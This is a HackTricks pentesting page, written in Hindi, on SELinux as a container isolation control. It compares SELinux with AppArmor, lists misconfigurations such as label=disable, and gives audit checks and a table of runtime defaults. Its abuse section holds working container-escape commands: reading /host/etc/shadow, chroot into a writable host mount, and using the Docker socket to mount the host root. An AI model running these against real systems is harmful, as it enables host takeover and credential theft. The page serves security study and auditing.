# SELinux

{{#include ../../../../banners/hacktricks-training.md}}

## अवलोकन

SELinux एक **लेबल-आधारित अनिवार्य पहुँच नियंत्रण** सिस्टम है। प्रत्येक संबंधित प्रक्रिया और ऑब्जेक्ट एक सुरक्षा संदर्भ (security context) रख सकते हैं, और नीति यह तय करती है कि कौन से डोमेन किस प्रकार के ऑब्जेक्ट्स के साथ और किस तरह इंटरैक्ट कर सकते हैं। कंटेनरीकृत वातावरण में, इसका सामान्यतः अर्थ यह है कि runtime कंटेनर प्रक्रिया को एक सीमित container डोमेन के अंतर्गत लॉन्च करता है और कंटेनर सामग्री को संबंधित प्रकारों के साथ लेबल करता है। यदि नीति सही ढंग से काम कर रही है, तो वह प्रोसेस उन चीज़ों को पढ़ने और लिखने में सक्षम हो सकती है जिन्हें उसके लेबल से छूने की उम्मीद होती है, जबकि अन्य होस्ट सामग्री तक उसकी पहुँच अस्वीकार कर दी जाती है, भले ही वह सामग्री किसी माउंट के माध्यम से दिखने लगे।

यह मुख्यधारा के Linux container डिप्लॉयमेंट में उपलब्ध सबसे शक्तिशाली होस्ट-साइड सुरक्षा उपायों में से एक है। यह Fedora, RHEL, CentOS Stream, OpenShift, और अन्य SELinux-केंद्रित इकोसिस्टम्स में विशेष रूप से महत्वपूर्ण है। उन वातावरणों में, जो रिव्यूअर SELinux की अनदेखी करता है वह अक्सर यह गलत समझ लेता है कि होस्ट समझौते का एक स्पष्ट दिखने वाला रास्ता क्यों असल में ब्लॉक है।

## AppArmor बनाम SELinux

सबसे सरल उच्च-स्तरीय अंतर यह है कि AppArmor पथ-आधारित है जबकि SELinux **लेबल-आधारित** है। इसका container security पर बड़ा प्रभाव पड़ता है। एक पथ-आधारित नीति अलग व्यवहार कर सकती है यदि वही होस्ट सामग्री अनपेक्षित माउंट पथ के तहत दिखने लगे। एक लेबल-आधारित नीति इसके बजाय पूछती है कि ऑब्जेक्ट का लेबल क्या है और प्रोसेस डोमेन उसके साथ क्या कर सकता है। इससे SELinux सरल नहीं बनता, लेकिन यह AppArmor-आधारित सिस्टम्स में रक्षक कभी-कभी गलती से मान लेते हैं ऐसे पथ-चालाख़ियों (path-trick) के खिलाफ इसे मजबूत बनाता है।

क्योंकि मॉडल लेबल-उन्मुख है, container वॉल्यूम हैंडलिंग और relabeling निर्णय सुरक्षा के लिहाज़ से महत्वपूर्ण होते हैं। यदि runtime या ऑपरेटर लेबल्स को "make mounts work" करने के लिए बहुत व्यापक रूप से बदल देता है, तो वह नीति सीमा जो वर्कलोड को सीमित करने के लिए होनी चाहिए थी, इच्छित से कहीं कमजोर पड़ सकती है।

## लैब

जाँचने के लिए कि SELinux होस्ट पर सक्रिय है या नहीं:
```bash
getenforce 2>/dev/null
sestatus 2>/dev/null
```
होस्ट पर मौजूदा लेबल देखने के लिए:
```bash
ps -eZ | head
ls -Zd /var/lib/containers 2>/dev/null
ls -Zd /var/lib/docker 2>/dev/null
```
एक सामान्य रन की तुलना उस रन से करें जहाँ labeling अक्षम हो:
```bash
podman run --rm fedora cat /proc/self/attr/current
podman run --rm --security-opt label=disable fedora cat /proc/self/attr/current
```
On an SELinux-सक्षम होस्ट पर, यह एक बहुत ही व्यावहारिक प्रदर्शन है क्योंकि यह अपेक्षित container domain के तहत चलने वाले वर्कलोड और उस enforcement layer से वंचित वर्कलोड के बीच का अंतर दिखाता है।

## रनटाइम उपयोग

Podman उन सिस्टम्स पर विशेष रूप से SELinux के साथ अच्छी तरह संरेखित होता है जहाँ SELinux प्लेटफॉर्म डिफ़ॉल्ट का हिस्सा होता है। Rootless Podman साथ में SELinux मुख्यधारा के container बेसलाइन में से एक सबसे मजबूत हैं क्योंकि प्रक्रिया पहले से ही host पक्ष पर unprivileged होती है और फिर भी MAC policy द्वारा सीमित रहती है। Docker भी जहाँ समर्थित हो SELinux का उपयोग कर सकता है, हालांकि administrators कभी-कभी volume-labeling friction से निपटने के लिए इसे अक्षम कर देते हैं। CRI-O और OpenShift अपने container isolation मॉडल में SELinux पर भारी निर्भर करते हैं। Kubernetes भी SELinux-संबंधित सेटिंग्स उजागर कर सकता है, लेकिन उनका मूल्य स्पष्ट रूप से इस बात पर निर्भर करता है कि node OS वास्तव में SELinux को सपोर्ट और लागू करता है या नहीं।

बार-बार मिलने वाला सबक यह है कि SELinux कोई वैकल्पिक सजावट नहीं है। जिन इकोसिस्टम्स के चारों ओर यह बना है, वहाँ यह अपेक्षित security boundary का हिस्सा होता है।

## गलत कॉन्फ़िगरेशन

क्लासिक गलती `label=disable` है। संचालनगत रूप से, यह अक्सर इसलिए होता है क्योंकि एक volume mount अस्वीकृत कर दिया गया और सबसे तेज़ तात्कालिक उत्तर के रूप में SELinux को मसले से हटाना चुना गया, बजाय इसके कि labeling मॉडल को ठीक किया जाए। एक और सामान्य गलती host सामग्री का गलत relabeling है। व्यापक relabel संचालन एप्लिकेशन को काम करवा सकते हैं, लेकिन वे यह भी बढ़ा सकते हैं कि container को किन चीज़ों को छूने की अनुमति है — वह मूल रूप से इरादे से बहुत आगे तक बढ़ सकता है।

यह भी महत्वपूर्ण है कि **installed** SELinux को **effective** SELinux के साथ न भ्रमित किया जाए। एक host SELinux को सपोर्ट कर सकता है और फिर भी permissive mode में हो सकता है, या runtime अपेक्षित domain के तहत workload लॉन्च नहीं कर रहा हो सकता। इन मामलों में सुरक्षा उस स्तर की नहीं होती जैसी दस्तावेज़ीकरण संकेत कर सकता है।

## दुरुपयोग

जब SELinux अनुपस्थित हो, permissive हो, या workload के लिए व्यापक रूप से अक्षम किया गया हो, तो host-mounted paths का दुरुपयोग करना बहुत आसान हो जाता है। वही bind mount जो अन्यथा labels द्वारा सीमित होता, अब host डेटा या host संशोधन तक सीधा मार्ग बन सकता है। यह विशेष रूप से प्रासंगिक होता है जब इसे writable volume mounts, container runtime directories, या ऐसे operational shortcuts के साथ जो सुविधा के लिए संवेदनशील host paths को उजागर करते हैं, मिलाया जाए।

SELinux अक्सर यह स्पष्ट करता है कि क्यों एक सामान्य breakout writeup एक होस्ट पर तुरंत काम कर जाता है लेकिन दूसरे पर बार-बार विफल रहता है, भले ही runtime flags समान दिखते हों। अक्सर गायब तत्व कोई namespace या capability नहीं होता, बल्कि एक label boundary होता है जो बरकरार रहा।

सबसे तेज़ व्यावहारिक जांच यह है कि सक्रिय context की तुलना की जाए और फिर उन mounted host paths या runtime directories का परीक्षण किया जाए जो सामान्यतः label-confined होतीं:
```bash
getenforce 2>/dev/null
cat /proc/self/attr/current
find / -maxdepth 3 -name '*.sock' 2>/dev/null | grep -E 'docker|containerd|crio'
find /host -maxdepth 2 -ls 2>/dev/null | head
```
यदि एक host bind mount मौजूद है और SELinux labeling अक्षम या कमजोर कर दी गई है, तो information disclosure अक्सर पहले होता है:
```bash
ls -la /host/etc 2>/dev/null | head
cat /host/etc/passwd 2>/dev/null | head
cat /host/etc/shadow 2>/dev/null | head
```
यदि mount writable है और container kernel के दृष्टिकोण से प्रभावी रूप से host-root है, तो अगला कदम अनुमान लगाने के बजाय नियंत्रित host modification का परीक्षण करना है:
```bash
touch /host/tmp/selinux_test 2>/dev/null && echo "host write works"
ls -l /host/tmp/selinux_test 2>/dev/null
```
SELinux-capable hosts पर, runtime state directories के आसपास labels खो जाने से सीधे privilege-escalation paths भी उजागर हो सकते हैं:
```bash
find /host/var/run /host/run -maxdepth 2 -name '*.sock' 2>/dev/null
find /host/var/lib -maxdepth 3 \( -name docker -o -name containers -o -name containerd \) 2>/dev/null
```
ये commands एक पूरी escape chain की जगह नहीं लेते, पर ये बहुत जल्दी से स्पष्ट कर देते हैं कि क्या SELinux ही वह कारण था जो host data access या host-side file modification रोक रहा था।

### पूरा उदाहरण: SELinux Disabled + Writable Host Mount

यदि SELinux labeling अक्षम है और host filesystem `/host` पर writable के रूप में माउंट है, तो एक पूरा host escape सामान्य bind-mount abuse केस बन जाता है:
```bash
getenforce 2>/dev/null
cat /proc/self/attr/current
touch /host/tmp/selinux_escape_test
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
यदि `chroot` सफल हो जाता है, तो container प्रक्रिया अब host filesystem से संचालित हो रही है:
```bash
id
hostname
cat /etc/passwd | tail
```
### पूरा उदाहरण: SELinux Disabled + Runtime Directory

यदि workload labels disabled होने के बाद runtime socket तक पहुँच सकता है, तो escape को runtime को सौंपा जा सकता है:
```bash
find /host/var/run /host/run -maxdepth 2 -name '*.sock' 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
```
प्रासंगिक अवलोकन यह है कि SELinux अक्सर ठीक इसी प्रकार के host-path या runtime-state एक्सेस को रोकने वाला नियंत्रण होता था।

## Checks

SELinux चेक का लक्ष्य यह पुष्टि करना है कि SELinux सक्षम है, वर्तमान security context की पहचान करना, और यह देखना कि जिन फाइलों या paths की आपको परवाह है वे वास्तव में label-confined हैं।
```bash
getenforce                              # Enforcing / Permissive / Disabled
ps -eZ | grep -i container              # Process labels for container-related processes
ls -Z /path/of/interest                 # File or directory labels on sensitive paths
cat /proc/self/attr/current             # Current process security context
```
यहां ध्यान देने योग्य बातें:

- `getenforce` आदर्श रूप से `Enforcing` लौटाना चाहिए; `Permissive` या `Disabled` पूरे SELinux सेक्शन का अर्थ बदल देते हैं।
- यदि वर्तमान process context अप्रत्याशित या बहुत व्यापक दिखता है, तो workload इच्छित container policy के तहत नहीं चल रहा हो सकता है।
- यदि host-mounted files या runtime directories के लेबल ऐसे हैं जिन तक process बहुत आसानी से पहुँच सकता है, तो bind mounts और भी खतरनाक हो जाते हैं।

जब आप किसी SELinux-सक्षम प्लेटफ़ॉर्म पर किसी container की समीक्षा कर रहे हों, तो labeling को गौण विवरण न समझें। कई मामलों में यह मुख्य कारणों में से एक होता है कि host पहले से compromised नहीं हुआ है।

## रनटाइम डिफ़ॉल्ट

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | होस्ट-निर्भर | SELinux-सक्षम होस्टों पर SELinux अलगाव उपलब्ध है, लेकिन सटीक व्यवहार host/daemon configuration पर निर्भर करता है | `--security-opt label=disable`, bind mounts का व्यापक relabeling, `--privileged` |
| Podman | आमतौर पर SELinux होस्टों पर सक्षम | SELinux सिस्टम पर Podman में SELinux अलगाव सामान्य हिस्सा है जब तक इसे अक्षम न किया गया हो | `--security-opt label=disable`, `label=false` in `containers.conf`, `--privileged` |
| Kubernetes | आम तौर पर Pod स्तर पर स्वतः असाइन नहीं होता | SELinux समर्थन मौजूद है, लेकिन Pods को आमतौर पर `securityContext.seLinuxOptions` या प्लेटफ़ॉर्म-विशिष्ट डिफ़ॉल्ट की आवश्यकता होती है; runtime और node समर्थन आवश्यक हैं | कमजोर या व्यापक `seLinuxOptions`, permissive/disabled nodes पर चलना, प्लेटफ़ॉर्म नीतियाँ जो labeling को अक्षम करती हैं |
| CRI-O / OpenShift style deployments | आमतौर पर भारी निर्भरता | इन परिवेशों में SELinux अक्सर node isolation मॉडल का एक मुख्य हिस्सा होता है | कस्टम नीतियाँ जो access को अत्यधिक व्यापक कर देती हैं, compatibility के लिए labeling को अक्षम करना |

SELinux के डिफ़ॉल्ट seccomp डिफ़ॉल्ट की तुलना में अधिक distribution-निर्भर होते हैं। Fedora/RHEL/OpenShift-style सिस्टमों पर, SELinux अक्सर isolation मॉडल का केंद्र होता है। non-SELinux सिस्टमों पर, यह मौजूद नहीं होता।
